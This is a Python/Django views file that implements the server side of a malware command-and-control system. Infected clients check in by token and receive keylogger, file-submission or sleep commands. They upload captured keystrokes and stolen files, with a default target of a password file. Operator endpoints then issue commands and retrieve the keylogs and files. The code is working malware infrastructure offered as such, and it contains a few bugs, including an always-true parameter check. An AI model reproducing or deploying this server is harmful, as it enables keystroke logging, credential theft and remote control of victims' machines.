from django.http import JsonResponse
from .models import Malware, Command, DataItem, FileItem
from django.views.decorators.csrf import csrf_exempt
from django.core import serializers

KEY_LOGGER_COMMAND = 'keylogger'
SUBMIT_FILE_COMMAND = 'submit_file'
SLEEP_COMMAND = 'sleep'

FILE_PATH = r'C:\my_password.txt'
TIME_TO_SLEEP = 10


@csrf_exempt
def cnc(request):
    print get_client_ip(request)
    if request.method == 'POST':
        if 'token' in request.POST and 'command' in request.POST and 'parameter' in request.POST or 'parameter':
            malware = get_malware_by_token(request.POST['token'])
            if malware:
                if request.POST['command'] == 'connect' or request.POST['command'] == 'sleep':
                    json_response = {
                        "success": True,
                        "message": 'Connection successfully established' if request.POST['command'] == 'connect' else 'Good morning!'
                    }

                    get_next_command(malware, json_response)
                elif request.POST['command'] == KEY_LOGGER_COMMAND:
                    json_response = {
                            "success": True,
                        }
                    try:
                        data_item = DataItem.objects.get(malware=malware, name=KEY_LOGGER_COMMAND)
                        data_item.data += request.POST['parameter'] + '\r\n'
                        data_item.data_chunks_sent += 1
                        data_item.save()

                        json_response["message"] = 'Keylog appended successfully'
                    except DataItem.DoesNotExist:
                        DataItem(
                            name=KEY_LOGGER_COMMAND,
                            data=request.POST['parameter'] + '\r\n',
                            malware=malware,
                        ).save()

                        json_response["message"] = 'Keylog stored successfully'
                    get_next_command(malware, json_response)
                elif request.POST['command'] == SUBMIT_FILE_COMMAND:
                    file = FileItem.objects.filter(malware=malware).last()
                    file_name = file.name if file is not None else FILE_PATH
                    FileItem(
                        name=file_name,
                        data=request.POST['parameter'],
                        malware=malware,
                    ).save()

                    Command(
                        type=SLEEP_COMMAND,
                        value=TIME_TO_SLEEP,
                        malware=malware
                    ).save()

                    json_response = {
                        "success": True,
                        "message": 'File stored successfully',
                        "command": SLEEP_COMMAND,
                        "argument": TIME_TO_SLEEP,
                    }
                else:
                    json_response = send_failure_message('Command not recognized')
            else:
                json_response = send_failure_message('Malware not authorized')
        else:
            json_response = send_failure_message('Request missing parameters')
    else:
        json_response = send_failure_message('POST method is required')

    return JsonResponse(json_response)


def get_client_ip(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')
    return ip


def get_next_command(malware, json_response):
    command = Command.objects.filter(malware=malware).last()
    if command is not None:
        json_response.update({
            "command": command.type,
            "argument": command.value,
        })
    else:
        json_response.update({
            "command": SLEEP_COMMAND,
            "argument": TIME_TO_SLEEP,
        })
        Command(
            type=SLEEP_COMMAND,
            value=TIME_TO_SLEEP,
            malware=malware,
        ).save()


def reset(request):
    if request.method == 'GET' and 'token' in request.GET:
        malware = get_malware_by_token(request.GET['token'])
        if malware:
            Command.objects.filter(malware=malware).delete()
            DataItem.objects.filter(malware=malware).delete()
            FileItem.objects.filter(malware=malware).delete()
            json_response = {
                "success": True,
                "message": 'Data deleted successfully',
            }
        else:
            json_response = send_failure_message('Malware not authorized')
    else:
        json_response = send_failure_message('Use GET method and specify a token')

    return JsonResponse(json_response)


def get_malware_by_token(token):
    try:
        return Malware.objects.get(token=token)
    except Malware.DoesNotExist:
        return None


def send_failure_message(message):
    return {
        "message": message,
        "success": False,
    }


def ui_all_malwares(request):
    if request.method == 'GET':
        json_response = serializers.serialize("json", Malware.objects.all())
    else:
        json_response = send_failure_message('Use GET method')

    return JsonResponse(json_response, safe=False)


@csrf_exempt
def ui_update_command(request):
    if request.method == 'POST':
        if 'token' in request.POST and 'command' in request.POST and 'parameter' in request.POST:
            if request.POST['command'] in [KEY_LOGGER_COMMAND, SUBMIT_FILE_COMMAND, SLEEP_COMMAND]:
                malware = get_malware_by_token(request.POST['token'])
                if malware:
                    last_command = Command.objects.filter(malware=malware).last()
                    if last_command is None or not last_command.type == request.POST['command']:
                        Command(
                            type=request.POST['command'],
                            value=request.POST['parameter'],
                            malware=malware,
                        ).save()

                    json_response = {
                        "command": request.POST['command'],
                        "value": request.POST['parameter'],
                    }
                else:
                    json_response = send_failure_message('Malware not authorized')
            else:
                json_response = send_failure_message('Command not recognized')
        else:
            json_response = send_failure_message('Request missing parameters')
    else:
        json_response = send_failure_message('POST method is required')

    return JsonResponse(json_response, safe=False)


@csrf_exempt
def ui_keylog(request):
    if request.method == 'POST':
        if 'token' in request.POST:
            malware = get_malware_by_token(request.POST['token'])
            if malware:
                key_log = DataItem.objects.filter(malware=malware, name=KEY_LOGGER_COMMAND).last()
                if key_log is not None:
                    json_response = serializers.serialize("json", [key_log, ])
                else:
                    json_response = {}
            else:
                json_response = send_failure_message('Malware not authorized')
        else:
            json_response = send_failure_message('Request missing parameters')
    else:
        json_response = send_failure_message('POST method is required')

    return JsonResponse(json_response, safe=False)


@csrf_exempt
def ui_file(request):
    if request.method == 'POST':
        if 'token' in request.POST:
            malware = get_malware_by_token(request.POST['token'])
            if malware:
                file = FileItem.objects.filter(malware=malware).last()
                if file is not None:
                    json_response = {
                        "path": file.name,
                        "data": file.data
                    }
                else:
                    json_response = {}
            else:
                json_response = send_failure_message('Malware not authorized')
        else:
            json_response = send_failure_message('Request missing parameters')
    else:
        json_response = send_failure_message('POST method is required')

    return JsonResponse(json_response, safe=False)


@csrf_exempt
def ui_initial_command(request):
    if request.method == 'POST':
        if 'token' in request.POST:
            malware = get_malware_by_token(request.POST['token'])
            if malware:
                last_command = Command.objects.filter(malware=malware).last()
                if last_command is None:
                    command = Command(
                        type=SLEEP_COMMAND,
                        value=TIME_TO_SLEEP,
                        malware=malware
                    )
                    command.save()
                    json_response = serializers.serialize("json", [command, ])
                else:
                    json_response = serializers.serialize("json", [last_command, ])
            else:
                json_response = send_failure_message('Malware not authorized')
        else:
            json_response = send_failure_message('Request missing parameters')
    else:
        json_response = send_failure_message('POST method is required')

    return JsonResponse(json_response, safe=False)
